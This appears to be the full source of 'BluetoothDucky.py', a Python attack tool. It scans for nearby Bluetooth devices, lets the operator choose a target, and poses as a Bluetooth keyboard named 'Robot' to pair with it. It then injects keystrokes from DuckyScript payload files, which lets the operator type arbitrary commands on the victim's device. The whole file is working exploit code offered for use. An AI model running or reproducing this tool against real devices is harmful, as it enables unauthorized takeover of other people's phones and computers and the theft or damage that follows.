#!/usr/bin/env python3
import subprocess
import sys
import time
import argparse
import logging
import re
import os
from colorama import Fore, Style, init
from art import text2art

from injector.hid import keyboard_report
from multiprocessing import Process
from injector.helpers import assert_address, log, run
from injector.client import KeyboardClient
from injector.adapter import Adapter
from injector.agent import PairingAgent
from injector.hid import Key
from injector.profile import register_hid_profile
from injector.ducky_convert import send_string, send_ducky_command

# Initialize colorama
init(autoreset=True)

# ASCII Art for the title (smaller font)
TITLE_ART = text2art("BluetoothDucky", font="small")

def parse_arguments():
    parser = argparse.ArgumentParser("BluetoothDucky.py")
    parser.add_argument("-i", "--interface", required=False, default="hci0", help="Bluetooth interface (default: hci0)")
    args = parser.parse_args()
    return args

def scan_for_devices():
    print(Fore.CYAN + TITLE_ART)
    print(Fore.YELLOW + "Scanning for available devices..." + Style.RESET_ALL)
    
    try:
        result = subprocess.run(["sudo", "hcitool", "scan"], capture_output=True, text=True, check=True)
        
        output = result.stdout
        lines = output.splitlines()
        
        if len(lines) <= 1:
            print(Fore.RED + "No Bluetooth devices found nearby." + Style.RESET_ALL)
            return None
        else:
            print(Fore.GREEN + "Available Bluetooth devices:" + Style.RESET_ALL)
            devices = []
            for i, line in enumerate(lines[1:]):
                parts = line.split()
                if len(parts) >= 2:
                    mac_address = parts[0]
                    device_name = " ".join(parts[1:])
                    print(Fore.BLUE + f"{i + 1}. Device: {device_name} ({mac_address})" + Style.RESET_ALL)
                    devices.append((mac_address, device_name))
            return devices
    
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Error occurred while scanning: {e}" + Style.RESET_ALL)
        return None
    except Exception as e:
        print(Fore.RED + f"An unexpected error occurred: {e}" + Style.RESET_ALL)
        return None

def select_device(devices):
    if not devices:
        print(Fore.RED + "No devices to select." + Style.RESET_ALL)
        return None
    
    while True:
        try:
            choice = int(input(Fore.YELLOW + "Select a device by number (or 0 to exit): " + Style.RESET_ALL))
            if choice == 0:
                return None
            elif 1 <= choice <= len(devices):
                return devices[choice - 1][0]
            else:
                print(Fore.RED + "Invalid choice. Please try again." + Style.RESET_ALL)
        except ValueError:
            print(Fore.RED + "Invalid input. Please enter a number." + Style.RESET_ALL)

def select_payload():
    payload_dir = "payloads"
    
    # إنشاء مجلد payloads إذا لم يكن موجودًا
    if not os.path.exists(payload_dir):
        print(Fore.YELLOW + f"Payload directory '{payload_dir}' not found. Creating it..." + Style.RESET_ALL)
        os.makedirs(payload_dir)
    
    payload_files = [f for f in os.listdir(payload_dir) if f.endswith(".txt")]
    if not payload_files:
        print(Fore.RED + "No payload files found in the 'payloads' directory." + Style.RESET_ALL)
        return None

    print(Fore.GREEN + "Available payloads:" + Style.RESET_ALL)
    for i, payload_file in enumerate(payload_files):
        print(Fore.BLUE + f"{i + 1}. {payload_file}" + Style.RESET_ALL)

    while True:
        try:
            choice = int(input(Fore.YELLOW + "Select a payload by number (or 0 to exit): " + Style.RESET_ALL))
            if choice == 0:
                return None
            elif 1 <= choice <= len(payload_files):
                return os.path.join(payload_dir, payload_files[choice - 1])
            else:
                print(Fore.RED + "Invalid choice. Please try again." + Style.RESET_ALL)
        except ValueError:
            print(Fore.RED + "Invalid input. Please enter a number." + Style.RESET_ALL)

def initialize_bluetooth_adapter(interface, target):
    run(["sudo", "service", "bluetooth", "restart"])
    time.sleep(0.5)

    profile_proc = Process(target=register_hid_profile, args=(interface, target))
    profile_proc.start()

    adapter = Adapter(interface)
    adapter.set_name("Robot")
    adapter.set_class(0x002540)
    run(["hcitool", "name", target])

    return adapter, profile_proc

def connect_to_target(adapter, client, target):
    retry_count = 0
    max_retries = 5
    while retry_count < max_retries:
        try:
            if not client.connect_sdp():
                log.error(Fore.RED + "Failed to connect to SDP, retrying..." + Style.RESET_ALL)
                retry_count += 1
                time.sleep(1)
                continue

            adapter.enable_ssp()
            log.success(Fore.GREEN + "Connected to SDP (L2CAP 1) on target" + Style.RESET_ALL)
            with PairingAgent(adapter.iface, target):
                client.connect_hid_interrupt()
                client.connect_hid_control()
                time.sleep(1)

                if client.c19.connected:
                    log.success(Fore.GREEN + "Connected to HID Interrupt (L2CAP 19) on target" + Style.RESET_ALL)
                    return True
                else:
                    log.error(Fore.RED + "Failed to connect to HID Interrupt, retrying..." + Style.RESET_ALL)
                    retry_count += 1
                    time.sleep(1)

        except Exception as e:
            log.error(Fore.RED + f"Exception occurred: {e}" + Style.RESET_ALL)
            retry_count += 1
            time.sleep(1)

    log.error(Fore.RED + "Failed to connect after maximum retries" + Style.RESET_ALL)
    return False

def execute_payload(client, payload_file):
    current_command_index = 0
    default_delay = 1

    duckyscript_to_hid = {
        'ENTER': Key.Enter,
        'GUI': Key.LeftMeta,
        'WINDOWS': Key.LeftMeta,
        'ALT': Key.LeftAlt,
        'CTRL': Key.LeftControl,
        'CONTROL': Key.LeftControl,
        'SHIFT': Key.LeftShift,
        'TAB': Key.Tab,
        'ESC': Key.Escape,
        'ESCAPE': Key.Escape,
        'INSERT': Key.Insert,
        'DELETE': Key.Delete,
        'HOME': Key.Home,
        'END': Key.End,
        'PAGEUP': Key.PageUp,
        'PAGEDOWN': Key.PageDown,
        'UP': Key.Up,
        'UPARROW': Key.Up,
        'DOWN': Key.Down,
        'DOWNARROW': Key.Down,
        'LEFT': Key.Left,
        'LEFTARROW': Key.Left,
        'RIGHT': Key.Right,
        'RIGHTARROW': Key.Right,
        'CAPSLOCK': Key.CapsLock,
        'NUMLOCK': Key.NumLock,
        'PRINTSCREEN': Key.PrintScreen,
        'SCROLLLOCK': Key.ScrollLock,
        'PAUSE': Key.Pause
    }

    with open(payload_file, 'r') as file:
        commands = [line.strip() for line in file.readlines()]

    while current_command_index < len(commands):
        line = commands[current_command_index]

        if line.startswith('REM') or not line:
            current_command_index += 1
            continue
        try:
            if line.startswith('DEFAULT_DELAY') or line.startswith('DEFAULTDELAY'):
                default_delay = float(line.split()[1]) / 1000
            elif line.startswith('DELAY'):
                delay_parts = line.split()
                delay_time = float(delay_parts[1]) / 1000 if len(delay_parts) > 1 else default_delay
                time.sleep(delay_time)
            elif line.startswith('STRING'):
                string_to_send = line.partition(' ')[2]
                send_string(client, string_to_send)
            elif '+' in line:
                send_ducky_command(client, line)
            else:
                log.debug(Fore.CYAN + f"Processing command: {line}" + Style.RESET_ALL)
                if line in duckyscript_to_hid:
                    key_code = duckyscript_to_hid[line]
                    log.debug(Fore.CYAN + f"Sending keypress for {line}: {key_code}" + Style.RESET_ALL)
                    client.send_keyboard_report(keyboard_report(key_code))
                    client.send_keyboard_report(keyboard_report())
                else:
                    send_ducky_command(client, line)

                time.sleep(default_delay)

            current_command_index += 1

        except Exception as e:
            log.error(Fore.RED + f"Unhandled exception: {e}" + Style.RESET_ALL)
            break

    if current_command_index >= len(commands):
        log.info(Fore.GREEN + "Payload execution completed." + Style.RESET_ALL)

def clean_up(adapter, profile_proc, client):
    log.status(Fore.YELLOW + "Disconnecting Bluetooth HID client" + Style.RESET_ALL)
    client.close()
    adapter.down()
    profile_proc.terminate()

if __name__ == "__main__":
    try:
        args = parse_arguments()
        
        devices = scan_for_devices()
        if not devices:
            sys.exit(0)
        
        target = select_device(devices)
        if not target:
            sys.exit(0)
        
        payload_file = select_payload()
        if payload_file:
            adapter, profile_proc = initialize_bluetooth_adapter(args.interface, target)
            client = KeyboardClient(target, auto_ack=True)

            if connect_to_target(adapter, client, target):
                log.status(Fore.YELLOW + f"Injecting payload: {os.path.basename(payload_file)}" + Style.RESET_ALL)
                execute_payload(client, payload_file)
    except Exception as e:
        log.error(Fore.RED + f"Unhandled exception: {e}" + Style.RESET_ALL)
    finally:
        if 'adapter' in locals() and 'profile_proc' in locals() and 'client' in locals():
            clean_up(adapter, profile_proc, client)
